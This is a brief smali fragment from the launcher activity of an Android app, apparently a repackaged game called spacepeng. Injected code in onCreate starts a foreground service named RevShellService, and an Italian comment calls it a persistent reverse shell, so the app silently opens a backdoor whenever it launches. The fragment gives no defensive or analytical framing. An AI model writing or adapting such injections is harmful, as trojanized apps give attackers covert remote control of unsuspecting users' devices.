...
.method protected onCreate(Landroid/os/Bundle;)V
    ...
    const-string v1, "onCreate: Starting RevShellService"

    invoke-virtual {v2, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    # Avvia Foreground Service per reverse shell persistente
    new-instance v1, Landroid/content/Intent;
    const-class v2, Lde/fgerbig/spacepeng/android/RevShellService;
    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v1}, Lde/fgerbig/spacepeng/android/AndroidLauncher;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
